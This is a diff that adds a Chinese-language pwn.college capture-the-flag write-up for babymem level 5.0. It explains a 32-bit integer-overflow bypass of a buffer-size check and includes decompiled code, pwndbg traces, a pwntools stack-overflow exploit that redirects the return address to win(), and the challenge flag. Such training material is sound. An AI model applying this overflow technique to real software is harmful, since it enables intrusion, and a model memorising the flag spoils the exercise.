@@ -1596,3 +1596,337 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`
+
+### Level 5.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
+
+#### Write-up
+
+```c {64, 68} ins={65-66, 69-70, 71-72} del={91} collapse={1-60, 76-87, 95-114}
+__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
+{
+  int *v3; // rax
+  char *v4; // rax
+  _QWORD v6[3]; // [rsp+0h] [rbp-B0h] BYREF
+  int v7; // [rsp+1Ch] [rbp-94h]
+  unsigned int v8; // [rsp+28h] [rbp-88h] BYREF
+  unsigned int v9; // [rsp+2Ch] [rbp-84h] BYREF
+  _QWORD v10[12]; // [rsp+30h] [rbp-80h] BYREF
+  __int16 v11; // [rsp+90h] [rbp-20h]
+  int v12; // [rsp+9Ch] [rbp-14h]
+  size_t nbytes; // [rsp+A0h] [rbp-10h]
+  void *buf; // [rsp+A8h] [rbp-8h]
+  __int64 savedregs; // [rsp+B0h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+B8h] [rbp+8h] BYREF
+
+  v7 = a1;
+  v6[2] = a2;
+  v6[1] = a3;
+  memset(v10, 0, sizeof(v10));
+  v11 = 0;
+  buf = v10;
+  nbytes = 0LL;
+  puts("The challenge() function has just been launched!");
+  sp_ = (__int64)v6;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v6) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
+  DUMP_STACK(sp_, sz_);
+  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
+  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
+  puts("including the saved base pointer and the saved return address, for a");
+  printf("total of %d bytes.\n", 8 * sz_);
+  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
+  puts("(\"above\" it in the stack are other local variables used by the function).");
+  puts("Your input will be read into this buffer.");
+  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 98);
+  puts("large input length, and thus overflow the buffer.\n");
+  puts("In this level, there is no \"win\" variable.");
+  puts("You will need to force the program to execute the win() function");
+  puts("by directly overflowing into the stored return address back to main,");
+  printf(
+    "which is stored at %p, %d bytes after the start of your input buffer.\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)buf);
+  printf(
+    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
+    rp_ - (_DWORD)buf + 8,
+    98);
+  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 98);
+  puts("and 8 that will overwrite the return address).\n");
+  puts("We have disabled the following standard memory corruption mitigations for this challenge:");
+  puts("- the canary is disabled, otherwise you would corrupt it before");
+  puts("overwriting the return address, and the program would abort.");
+  puts("- the binary is *not* position independent. This means that it will be");
+  puts("located at the same spot every time it is run, which means that by");
+  puts("analyzing the binary (using objdump or reading this output), you can");
+  puts("know the exact value that you need to overwrite the return address with.\n");
+  puts("This challenge will let you send multiple payload records concatenated together.");
+  puts("It will make sure that the total payload size fits in the allocated buffer");
+  puts("on the stack. Can you send a carefully crafted input to break this calculation?");
+  printf("Number of payload records to send: ");
+  __isoc99_scanf("%u", &v9);
+  if ( !v9 )
+    __assert_fail("record_num > 0", "/challenge/babymem-level-5-0.c", 0x8Fu, "challenge");
+  printf("Size of each payload record: ");
+  __isoc99_scanf("%u", &v8);
+  if ( !v8 )
+    __assert_fail("record_size > 0", "/challenge/babymem-level-5-0.c", 0x92u, "challenge");
+  if ( v8 * v9 > 0x62 )
+    __assert_fail("record_size * record_num <= 98", "/challenge/babymem-level-5-0.c", 0x93u, "challenge");
+  nbytes = v8 * (unsigned __int64)v9;
+  printf("Computed total payload size: %lu\n", nbytes);
+  printf("You have chosen to send %lu bytes of input!\n", nbytes);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)buf + nbytes,
+    nbytes - 98);
+  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
+  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
+  puts("You will want to overwrite the return value from challenge()");
+  printf("(located at %p, %d bytes past the start of the input buffer)\n", (const void *)rp_, rp_ - (_DWORD)buf);
+  printf("with %p, which is the address of the win() function.\n", win);
+  puts("This will cause challenge() to return directly into the win() function,");
+  puts("which will in turn give you the flag.");
+  puts("Keep in mind that you will need to write the address of the win() function");
+  puts("in little-endian (bytes backwards) so that it is interpreted properly.\n");
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v12 = read(0, buf, nbytes);
+  if ( v12 < 0 )
+  {
+    v3 = __errno_location();
+    v4 = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", v4);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v12);
+  puts("Let's see what happened with the stack:\n");
+  DUMP_STACK(sp_, sz_);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", buf);
+  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
+  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
+  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
+  printf("- the address of win() is %p.\n", win);
+  putchar(10);
+  puts("If you have managed to overwrite the return address with the correct value,");
+  puts("challenge() will jump straight to win() when it returns.");
+  printf("Let's try it now!\n\n");
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+首先，两个 `__isoc99_scanf` 都读取无符号数，易想到补码性质和隐式转换问题。其次，读取输入后两条 `if` 分别判断两个 `__isoc99_scanf` 输入是否等于零，为零就断言失败。最后，不能满足 `v8 * v9 > 0x62` 这条判断，也就是输入的两个有符号数相乘（通过反汇编得知这里的乘法使用 `imul`）的结果必须小于等于 98，否则也会断言失败。
+
+通过程序给出的提示信息我们已经知道 payload 的大小为 144 bytes，所以我们要做的就是想办法满足在 `v8 * v9 > 0x62` 不成立的前提下获得起码 144 bytes 的输入大小。因为最后 `read` 的输入的大小是通过 `nbytes = v8 * (unsigned __int64)v9;` 设置的，所以我们只要关注 `v8`、`v9` 的选择。
+
+如果我们输入两个 `-1`，那确实绕过了 `v8 * v9 > 0x62`。但是调试发现 `nbytes` 超出 `ssize_t` 的大小（显然 `0xfffffffe00000001 > 2**63-1`）会导致 `read` 不会读取任何数据，直接返回 `-1`，最后程序抛出异常并退出：
+
+```asm wrap=false showLineNumbers=false del={28, 65, 85-87} collapse={5-24, 29-58, 69-81, 91-114}
+pwndbg> c
+Continuing.
+
+Breakpoint 2, 0x000000000040291c in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0x7ffd77ce3510 ◂— 0
+ RBX  0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
+ RCX  0
+*RDX  0xfffffffe00000001
+*RDI  0
+*RSI  0x7ffd77ce3510 ◂— 0
+*R8   0x75
+*R9   0xffffffec
+ R10  0
+*R11  0x202
+ R12  1
+ R13  0
+ R14  0x796eb2ce0000 (_rtld_global) —▸ 0x796eb2ce12e0 ◂— 0
+ R15  0
+ RBP  0x7ffd77ce3590 —▸ 0x7ffd77ce45c0 —▸ 0x7ffd77ce4660 —▸ 0x7ffd77ce46c0 ◂— 0
+ RSP  0x7ffd77ce34e0 ◂— 0xa /* '\n' */
+*RIP  0x40291c (challenge+1342) ◂— call 0x401170
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x40291c <challenge+1342>    call   read@plt                    <read@plt>
+        fd: 0 (pipe:[419970])
+        buf: 0x7ffd77ce3510 ◂— 0
+        nbytes: 0xfffffffe00000001
+
+   0x402921 <challenge+1347>    mov    dword ptr [rbp - 0x14], eax
+   0x402924 <challenge+1350>    cmp    dword ptr [rbp - 0x14], 0
+   0x402928 <challenge+1354>    jns    challenge+1400              <challenge+1400>
+
+   0x40292a <challenge+1356>    call   __errno_location@plt        <__errno_location@plt>
+
+   0x40292f <challenge+1361>    mov    eax, dword ptr [rax]
+   0x402931 <challenge+1363>    mov    edi, eax
+   0x402933 <challenge+1365>    call   strerror@plt                <strerror@plt>
+
+   0x402938 <challenge+1370>    mov    rsi, rax
+   0x40293b <challenge+1373>    lea    rdi, [rip + 0x147e]     RDI => 0x403dc0 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x402942 <challenge+1380>    mov    eax, 0                  EAX => 0
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd77ce34e0 ◂— 0xa /* '\n' */
+01:0008│-0a8     0x7ffd77ce34e8 —▸ 0x7ffd77ce46f8 —▸ 0x7ffd77ce55d8 ◂— 'MOTD_SHOWN=pam'
+02:0010│-0a0     0x7ffd77ce34f0 —▸ 0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
+03:0018│-098     0x7ffd77ce34f8 ◂— 0x100000000
+04:0020│-090     0x7ffd77ce3500 —▸ 0x7ffd77ce3520 ◂— 0
+05:0028│-088     0x7ffd77ce3508 ◂— 0xffffffffffffffff
+06:0030│ rax rsi 0x7ffd77ce3510 ◂— 0
+07:0038│-078     0x7ffd77ce3518 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x40291c challenge+1342
+   1         0x402b32 main+198
+   2   0x796eb2aade08
+   3   0x796eb2aadecc __libc_start_main+140
+   4         0x4011fe _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+
+Breakpoint 3, 0x0000000000402921 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0xffffffffffffffff
+ RBX  0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
+*RCX  0x796eb2b93c21 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
+*RDX  0xffffffffffffff88
+ RDI  0
+ RSI  0x7ffd77ce3510 ◂— 0
+ R8   0x75
+ R9   0xffffffec
+ R10  0
+*R11  0x246
+ R12  1
+ R13  0
+ R14  0x796eb2ce0000 (_rtld_global) —▸ 0x796eb2ce12e0 ◂— 0
+ R15  0
+ RBP  0x7ffd77ce3590 —▸ 0x7ffd77ce45c0 —▸ 0x7ffd77ce4660 —▸ 0x7ffd77ce46c0 ◂— 0
+ RSP  0x7ffd77ce34e0 ◂— 0xa /* '\n' */
+*RIP  0x402921 (challenge+1347) ◂— mov dword ptr [rbp - 0x14], eax
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+   0x40291c <challenge+1342>    call   read@plt                    <read@plt>
+
+ ► 0x402921 <challenge+1347>    mov    dword ptr [rbp - 0x14], eax     [0x7ffd77ce357c] => 0xffffffff
+   0x402924 <challenge+1350>    cmp    dword ptr [rbp - 0x14], 0       0xffffffff - 0x0     EFLAGS => 0x286 [ cf PF af zf SF IF df of ]
+   0x402928 <challenge+1354>    jns    challenge+1400              <challenge+1400>
+
+   0x40292a <challenge+1356>    call   __errno_location@plt        <__errno_location@plt>
+
+   0x40292f <challenge+1361>    mov    eax, dword ptr [rax]
+   0x402931 <challenge+1363>    mov    edi, eax
+   0x402933 <challenge+1365>    call   strerror@plt                <strerror@plt>
+
+   0x402938 <challenge+1370>    mov    rsi, rax
+   0x40293b <challenge+1373>    lea    rdi, [rip + 0x147e]     RDI => 0x403dc0 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x402942 <challenge+1380>    mov    eax, 0                  EAX => 0
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffd77ce34e0 ◂— 0xa /* '\n' */
+01:0008│-0a8 0x7ffd77ce34e8 —▸ 0x7ffd77ce46f8 —▸ 0x7ffd77ce55d8 ◂— 'MOTD_SHOWN=pam'
+02:0010│-0a0 0x7ffd77ce34f0 —▸ 0x7ffd77ce46e8 —▸ 0x7ffd77ce55a2 ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-5-0'
+03:0018│-098 0x7ffd77ce34f8 ◂— 0x100000000
+04:0020│-090 0x7ffd77ce3500 —▸ 0x7ffd77ce3520 ◂— 0
+05:0028│-088 0x7ffd77ce3508 ◂— 0xffffffffffffffff
+06:0030│ rsi 0x7ffd77ce3510 ◂— 0
+07:0038│-078 0x7ffd77ce3518 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x402921 challenge+1347
+   1         0x402b32 main+198
+   2   0x796eb2aade08
+   3   0x796eb2aadecc __libc_start_main+140
+   4         0x4011fe _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg>
+```
+
+查看 `read` 的定义，让我忍不住想吐槽这奇葩的设计：为了能够返回有符号数错误码，返回值类型被设置为 `ssize_t`，但是可接收的最大输入值类型为 `size_t`。显然 `ssize_t < size_t`，也就是说我们提供的输入大小可能超出返回值（输入进去的数据的大小）的可承载范围，如果超出了就抛出 `-1`。但又没有办法做到返回值类型和最大输入类型的匹配，如果返回值类型改成 `size_t` 就会出现错误码和输入大小混淆的问题；如果最大输入大小类型改成 `ssize_t` 又很不合理，因为我们显然不能输入大小为负的内容。
+
+```c
+// attributes: thunk
+ssize_t read(int fd, void *buf, size_t nbytes)
+{
+  return read(fd, buf, nbytes);
+}
+```
+
+言归正传，既然我们不能通过最方便的两个 `-1` 解决问题，那么下面就思考一下整数溢出的其它特点。
+
+我们注意到在判断 `v8 * v9 > 0x62` 的时候做的都是 32 bits 运算：
+
+```asm wrap=false showLineNumbers=false
+ ► 0x40277d <challenge+927>    mov    edx, dword ptr [rbp - 0x88]     EDX, [0x7ffcfb641768] => 0xffffffff
+   0x402783 <challenge+933>    mov    eax, dword ptr [rbp - 0x84]     EAX, [0x7ffcfb64176c] => 0xffffffff
+   0x402789 <challenge+939>    imul   eax, edx
+   0x40278c <challenge+942>    cmp    eax, 0x62                       0x1 - 0x62     EFLAGS => 0x297 [ CF PF AF zf SF IF df of ]
+   0x40278f <challenge+945>  ✔ jbe    challenge+978               <challenge+978>
+```
+
+两个 `-1` 行不通是因为它们相乘得到的无符号结果太大了，超出了 `ssize_t` 的可容纳范围。那有没有两个数可以在绕过 `v8 * v9 > 0x62` 且乘积的无符号表示大小不低于 144 的前提下又保证处于 `ssize_t` 的范围呢？
+
+如果我们提供的输入是 `INT32_MAX`，或者 `INT32_MIN`，和 `2`，或其它任何满足 `(v8 * v9) & 0xffffffff == 0x0` 的一对数，就可以巧妙的绕过 `v8 * v9 > 0x62` 的判断了！
+
+这用到了整数溢出的原理，`INT32_MAX * 2` 或者 `INT32_MIN * 2` 都会溢出到更高位，低位就变成 0 了。而我们在做判断的时候只使用了低 32 bits，不关心高位的情况，那么只要让低 32 bits 的大小小于等于 `0x62` 即可。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, pause, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-5-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+927
+b *challenge+1326
+b *challenge+1342
+b *challenge+1347
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch(debug=False)
+
+payload = b"".ljust(136, b"A") + p64(0x4022D7)
+
+INT32_MAX = str((2**31)).encode()
+
+target.recvuntil(b"Number of payload records to send: ")
+target.sendline(INT32_MAX)
+target.recvuntil(b"Size of each payload record: ")
+target.sendline(b"2")
+target.sendline(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{AcH-0L9UpmOONC81mhni9OzJVhD.01N5IDL5cTNxgzW}`
